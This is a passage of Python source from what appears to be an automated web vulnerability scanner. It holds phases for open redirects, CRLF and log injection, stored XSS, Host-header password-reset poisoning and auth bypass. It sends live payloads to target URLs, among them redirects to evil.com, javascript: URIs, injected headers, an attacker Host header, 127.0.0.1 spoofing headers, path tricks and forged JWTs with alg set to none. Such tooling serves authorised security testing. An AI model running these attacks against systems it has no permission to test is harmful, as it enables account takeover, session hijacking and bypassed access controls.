    log("info", "Phase 99c-REDIRABUSE: open redirect deep testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    redir_file = outdir / "open_redirect.txt"
    if redir_file.exists():
        all_urls = read_lines(redir_file) + all_urls
    if not all_urls:
        log("warn", "99c-REDIRABUSE: no URLs; skipping")
        return {"99c-REDIRABUSE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    redir_params = ["url=", "redirect=", "next=", "return=", "goto=", "to=", "out=",
                    "continue=", "forward=", "link=", "dest=", "site=", "target="]
    redir_urls = [u for u in all_urls if any(p in u.lower() for p in redir_params)]
    if not redir_urls:
        redir_urls = all_urls
    payloads = [
        "//evil.com",
        "%2F%2Fevil.com",
        "\\/evil.com",
        "//evil%0d%0a.com",
        "///evil.com",
        "/\\evil.com",
        "javascript:alert(1)",
    ]
    for url in redir_urls[:_PIPELINE_CFG.sample_urls_redirabuse]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        target_param = None
        for param in redir_params:
            param_name = param.rstrip("=")
            if param_name in qs:
                target_param = param_name
                break
        if not target_param:
            for key in qs:
                if key.lower() in ("url", "redirect", "next", "return", "goto", "to", "out", "continue", "forward", "link", "dest", "site", "target"):
                    target_param = key
                    break
        if not target_param:
            continue
        for payload in payloads:
            qs[target_param] = [payload]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, resp_h, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                location = ""
                if hasattr(resp_h, "get"):
                    location = resp_h.get("Location", "")
                elif hasattr(resp_h, "__getitem__"):
                    try:
                        location = resp_h["Location"]
                    except (KeyError, TypeError):
                        pass
                if "evil.com" in location or "javascript:" in location:
                    findings.append(f"[open-redirect] {test_url} → {location}")
                elif status in (301, 302, 303, 307, 308) and "evil" in str(location).lower():
                    findings.append(f"[open-redirect-{status}] {test_url} → {location}")
            except Exception:
                pass
    if not findings:
        findings.append("[redir-abuse] No open redirect abuse found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99c-REDIRABUSE: {len(findings)} findings → {out}")
    return {"99c-REDIRABUSE": str(_out), "count": len(findings)}


async def phase_99d_LOGTRIGGER(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99d-LOGTRIGGER"}:
        return {}
    _out = outdir / "log_injection_trigger.txt"
    if _out.exists() and not force:
        return {"99d-LOGTRIGGER": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99d-LOGTRIGGER: log injection triggering")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99d-LOGTRIGGER: no URLs; skipping")
        return {"99d-LOGTRIGGER": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    crlf_payloads = [
        "INJECT\r\nX-Injected: true",
        "INJECT%0d%0aX-Injected:%20true",
        "INJECT%0d%0a%0d%0a<script>alert(1)</script>",
    ]
    for url in all_urls[:_PIPELINE_CFG.sample_urls_logtrigger]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        if not qs:
            continue
        first_param = list(qs.keys())[0]
        for payload in crlf_payloads[:1]:
            qs[first_param] = [payload]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, resp_h, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")[:2000]
                if "X-Injected" in str(resp_h) or "x-injected" in body.lower():
                    findings.append(f"[header-injection] {test_url} — CRLF header injection confirmed")
                if "INJECT" in body and "<script>" in body:
                    findings.append(f"[log-xss] {test_url} — payload reflected in response body")
            except Exception:
                pass
        await _throttle_rate()
        try:
            ua_payload = "Mozilla/5.0\r\nX-Injected: true"
            req = urllib.request.Request(url, headers={"User-Agent": ua_payload, **_extra_h})
            status, resp_h, _ = await _async_urlopen(_urlopen, req, timeout=10)
            if "X-Injected" in str(resp_h):
                findings.append(f"[ua-injection] {url} — User-Agent CRLF injection confirmed")
        except Exception:
            pass
    if not findings:
        findings.append("[log-trigger] No log injection vectors found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99d-LOGTRIGGER: {len(findings)} findings → {out}")
    return {"99d-LOGTRIGGER": str(_out), "count": len(findings)}


async def phase_99e_XSSSTORED(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99e-XSSSTORED"}:
        return {}
    _out = outdir / "stored_xss_verified.txt"
    if _out.exists() and not force:
        return {"99e-XSSSTORED": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99e-XSSSTORED: stored XSS verification")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99e-XSSSTORED: no URLs; skipping")
        return {"99e-XSSSTORED": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    xss_marker = "rc_xss_test_" + str(int(time.time()))[-6:]
    form_urls = [u for u in all_urls if any(m in u.lower() for m in
                 ("/comment", "/feedback", "/contact", "/profile", "/post", "/submit", "/form"))]
    if not form_urls:
        form_urls = all_urls[:_PIPELINE_CFG.sample_urls_xssstored]
    for url in form_urls[:_PIPELINE_CFG.sample_urls_xssstored]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            form_tags = re.findall(r'<form[^>]*>(.*?)</form>', body, re.S | re.I)
            for form_content in form_tags:
                inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', form_content, re.I)
                textareas = re.findall(r'<textarea[^>]+name=["\']([^"\']+)["\']', form_content, re.I)
                field_names = inputs + textareas
                if field_names:
                    post_data = {fn: xss_marker for fn in field_names}
                    encoded = urllib.parse.urlencode(post_data).encode()
                    req2 = urllib.request.Request(url, data=encoded,
                                                  headers={"User-Agent": "Mozilla/5.0",
                                                           "Content-Type": "application/x-www-form-urlencoded",
                                                           **_extra_h})
                    try:
                        await _async_urlopen(_urlopen, req2, timeout=10)
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    req3 = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    _, _, body_bytes3 = await _async_urlopen(_urlopen, req3, timeout=10)
                    body3 = body_bytes3.decode("utf-8", errors="ignore")
                    if xss_marker in body3:
                        findings.append(f"[stored-xss] {url} — marker '{xss_marker}' persisted in response")
        except Exception:
            continue
    if not findings:
        findings.append("[stored-xss] No stored XSS vectors verified")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99e-XSSSTORED: {len(findings)} findings → {out}")
    return {"99e-XSSSTORED": str(_out), "count": len(findings)}


async def phase_99f_HOSTABUSE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99f-HOSTABUSE"}:
        return {}
    _out = outdir / "host_header_abuse.txt"
    if _out.exists() and not force:
        return {"99f-HOSTABUSE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99f-HOSTABUSE: host header injection extended")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99f-HOSTABUSE: no URLs; skipping")
        return {"99f-HOSTABUSE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    attacker_host = "evil.attacker.com"
    pw_reset_urls = [u for u in all_urls if any(m in u.lower() for m in
                     ("/password/reset", "/forgot", "/reset-password", "/pw-reset"))]
    for url in pw_reset_urls[:_PIPELINE_CFG.sample_hosts_hostabuse]:
        await _throttle_rate()
        try:
            post_data = urllib.parse.urlencode({"email": "admin@example.com"}).encode()
            req = urllib.request.Request(url, data=post_data,
                                         headers={"User-Agent": "Mozilla/5.0",
                                                  "Host": attacker_host,
                                                  "Content-Type": "application/x-www-form-urlencoded",
                                                  **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if attacker_host in body:
                findings.append(f"[host-header-poison] {url} — Host header reflected in response")
            if "http" in body and attacker_host in body:
                findings.append(f"[pw-reset-poison] {url} — password reset link contains attacker host")
        except Exception:
            continue
    for url in all_urls[:_PIPELINE_CFG.sample_hosts_hostabuse]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0",
                                                       "X-Forwarded-Host": attacker_host,
                                                       **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")[:2000]
            if attacker_host in body:
                findings.append(f"[xforwarded-host] {url} — X-Forwarded-Host reflected")
        except Exception:
            continue
    if not findings:
        findings.append("[host-abuse] No host header injection found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99f-HOSTABUSE: {len(findings)} findings → {out}")
    return {"99f-HOSTABUSE": str(_out), "count": len(findings)}


async def phase_99g_AUTHBYPASSADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99g-AUTHBYPASSADV"}:
        return {}
    _out = outdir / "auth_bypass_advanced.txt"
    if _out.exists() and not force:
        return {"99g-AUTHBYPASSADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99g-AUTHBYPASSADV: advanced auth bypass techniques")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99g-AUTHBYPASSADV: no URLs; skipping")
        return {"99g-AUTHBYPASSADV": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    auth_urls = [u for u in all_urls if any(m in u.lower() for m in
                 ("/admin", "/dashboard", "/manage", "/internal", "/api/v1/admin",
                  "/panel", "/console", "/settings"))]
    if not auth_urls:
        auth_urls = all_urls[:_PIPELINE_CFG.sample_urls_authbypassadv]
    jwt_tokens = []
    for url in all_urls:
        for hdr_val in _extra_h.values():
            for token in str(hdr_val).split():
                token = token.strip(",;\"'")
                if token.startswith("eyJ") and "." in token:
                    jwt_tokens.append(token)
    for url in auth_urls[:_PIPELINE_CFG.sample_urls_authbypassadv]:
        parsed = urllib.parse.urlparse(url)
        bypass_headers = [
            {"X-Original-URL": parsed.path},
            {"X-Rewrite-URL": parsed.path},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
        ]
        for hdr_dict in bypass_headers:
            await _throttle_rate()
            try:
                merged = {**_extra_h, "User-Agent": "Mozilla/5.0", **hdr_dict}
                req = urllib.request.Request(url, headers=merged)
                status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[auth-bypass-header] {url} — {list(hdr_dict.keys())[0]}: {list(hdr_dict.values())[0]} → HTTP 200")
            except Exception:
                pass
        path_bypasses = [
            f"/./{parsed.path.lstrip('/')}",
            f"{parsed.path}/.",
            f"/{parsed.path.lstrip('/')}//",
            f"/{parsed.path.lstrip('/')};",
            f"/{parsed.path.lstrip('/')}%20",
            f"/{parsed.path.lstrip('/')}%09",
        ]
        for bp in path_bypasses[:3]:
            test_url = urllib.parse.urlunparse(parsed._replace(path=bp))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[auth-bypass-path] {url} → {test_url} (HTTP 200)")
            except Exception:
                pass
        if jwt_tokens:
            for token in jwt_tokens[:1]:
                try:
                    parts = token.split(".")
                    if len(parts) == 3:
                        import base64 as _b64
                        payload = json.loads(_b64.urlsafe_b64decode(parts[1] + "=="))
                        payload["alg"] = "none"
                        new_payload = _b64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
                        forged = f"{parts[0]}.{new_payload}."
                        forged_headers = {**_extra_h, "Authorization": f"Bearer {forged}", "User-Agent": "Mozilla/5.0"}
                        await _throttle_rate()
                        req = urllib.request.Request(url, headers=forged_headers)
                        status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                        if status == 200:
                            findings.append(f"[jwt-none-bypass] {url} — JWT alg=none accepted (HTTP 200)")
                except Exception:
                    pass
    if not findings:
        findings.append("[auth-bypass-adv] No advanced auth bypasses found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99g-AUTHBYPASSADV: {len(findings)} findings → {out}")
    return {"99g-AUTHBYPASSADV": str(_out), "count": len(findings)}
